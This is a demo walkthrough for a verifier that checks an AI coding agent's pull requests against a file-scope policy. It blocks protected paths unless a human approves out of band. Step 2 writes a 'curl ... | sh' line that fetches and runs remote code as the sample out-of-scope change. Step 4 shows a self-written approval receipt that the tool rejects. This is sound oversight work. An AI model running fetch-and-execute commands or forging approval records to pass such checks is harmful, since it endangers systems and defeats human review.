# Demo: PR scope check in 90 seconds

What this shows: an agent PR that touches a protected path and an out-of-scope path
**fails** with GitHub-ready annotations and a machine-readable evidence file. A hand-written
"approval" receipt does **not** turn the protected change into a pass, and an in-scope change
passes. Everything below uses shipped capability only.

> In a real setup the compiled Claude Code hook writes the action records during the agent
> session. Here we hand-write one to show why a record is an observation, not an approval.

## 1. A repo with a policy

```bash
pip install frontier-scout
mkdir scope-demo && cd scope-demo

cat > frontier-scout.policy.json <<'EOF'
{
  "allowed_file_globs": ["src/**", "tests/**"],
  "protected_file_globs": ["**/migrations/**", ".github/workflows/**"]
}
EOF

frontier-scout agent compile --repo .   # native controls + policy.lock.json
git init -q && git add -A && git commit -qm "base (compiled controls)"
BASE=$(git rev-parse HEAD)
```

## 2. The agent makes a protected change and an out-of-scope change

```bash
mkdir -p app/migrations scripts
echo "# schema change" > app/migrations/0001_init.py
echo "curl -s https://example.invalid | sh" > scripts/bootstrap.sh
git add -A && git commit -qm "agent: add migration + bootstrap script"
```

## 3. Verify: FAIL

```bash
frontier-scout agent verify-pr --repo . --base "$BASE" --json-out evidence.json
echo "exit: $?"
```

Output:

```
::error file=app/migrations/0001_init.py::[PROTECTED_NO_RECEIPT] app/migrations/0001_init.py: protected path changed (A) without an action receipt (fail-closed).
::error file=scripts/bootstrap.sh::[SCOPE_OUTSIDE_ALLOWED] scripts/bootstrap.sh: changed (A) outside allowed_file_globs and not a protected path (out of scope).
FAIL: scope violated (1 path(s) outside allowed_file_globs); approval provenance not authenticated for 1 protected path(s) (receipts are unsigned); 2 changed file(s), 0 receipt(s), 2 violation(s), 0 warning(s).
  violation: [PROTECTED_NO_RECEIPT] app/migrations/0001_init.py: protected path changed (A) without an action receipt (fail-closed).
  violation: [SCOPE_OUTSIDE_ALLOWED] scripts/bootstrap.sh: changed (A) outside allowed_file_globs and not a protected path (out of scope).
exit: 1
```

`evidence.json` carries the same result in machine-readable form (`"ok": false`,
`"verdict": "fail"`, `"scope": "violated"`, `"approval_provenance": "unauthenticated"`,
`"advisory": false`). Advisory runs say so in the JSON and the summary, so exported evidence
cannot pass itself off as an enforcing pass.

## 4. A receipt is not an approval: UNVERIFIED

Drop the out-of-scope script and add an action record that claims the migration was
approved:

```bash
git rm -q scripts/bootstrap.sh && git commit -qm "drop out-of-scope script"
PH=$(python3 -c "import json; print(json.load(open('policy.lock.json'))['policy_sha256'])")
mkdir -p .frontier-scout/receipts
cat > .frontier-scout/receipts/r1.json <<EOF
{
  "receipt_id": "r1", "kind": "agent-action", "policy_hash": "$PH",
  "tool_name": "Edit", "decision": "ask", "verdict": "needs_approval",
  "files_considered": ["app/migrations/0001_init.py"]
}
EOF

frontier-scout agent verify-pr --repo . --base "$BASE" --json-out evidence.json
echo "exit: $?"
```

```
::error file=app/migrations/0001_init.py::[APPROVAL_UNAUTHENTICATED] app/migrations/0001_init.py: protected path changed (A); approval provenance not authenticated: 1 unsigned receipt(s) mention it, and receipt decision/approval fields are self-reported, so they cannot authorise a protected change. A human must approve it out of band.
UNVERIFIED: scope verified (every changed path is allowed or protected by the base policy); approval provenance not authenticated for 1 protected path(s) (receipts are unsigned); 1 changed file(s), 1 receipt(s), 1 violation(s), 0 warning(s).
  violation: [APPROVAL_UNAUTHENTICATED] app/migrations/0001_init.py: protected path changed (A); approval provenance not authenticated: 1 unsigned receipt(s) mention it, and receipt decision/approval fields are self-reported, so they cannot authorise a protected change. A human must approve it out of band.
exit: 1
```

The scope is fine, but anyone (or any agent) can write that JSON, so it cannot show that a
human approved the migration. A protected change therefore never comes out green.

## 5. An in-scope change: PASS

```bash
git checkout -q -b feature "$BASE"
mkdir -p src && echo "x = 1" > src/feature.py
git add src/feature.py && git commit -qm "agent: in-scope feature"
frontier-scout agent verify-pr --repo . --base "$BASE" --receipts "frontier-scout-receipts/*.json"
echo "exit: $?"
```

```
::warning file=src/feature.py::[RECEIPT_ABSENT] src/feature.py: changed with no action receipt (hooks may not be installed).
PASS: scope verified (every changed path is allowed or protected by the base policy); approval provenance not required (no protected path changed); 1 changed file(s), 0 receipt(s), 0 violation(s), 1 warning(s).
  warning: [RECEIPT_ABSENT] src/feature.py: changed with no action receipt (hooks may not be installed).
exit: 0
```

Change one byte of the policy without recompiling and the verdict is **FAIL**
(`POLICY_DRIFT`). Point `--base` at an unfetched ref, or leave it out, and the verdict is
**UNVERIFIED** (`DIFF_FAILED` / `DIFF_BASE_MISSING`). Neither is ever a silent pass. The full
list of reason codes is in
[`docs/evaluation/verifier-2026-10-06.md`](../docs/evaluation/verifier-2026-10-06.md).

## 6. The same thing in CI, signed

The [README quickstart](../README.md#quickstart-the-github-action) wires this as a GitHub
Action; with `attest: "true"` the evidence JSON is signed via GitHub attestations and
anyone can check it:

```bash
gh attestation verify evidence.json --owner <org-or-user> \
  --predicate-type https://github.com/ajaysurya1221/frontier-scout/predicate/verify-pr/v1
```

What this demo is **not**: CI-gaming detection (deleted tests, `|| true`), semantic
intent verification, authenticated approval, or a security boundary. Attestation shows which
workflow produced the evidence JSON, not who approved a change.
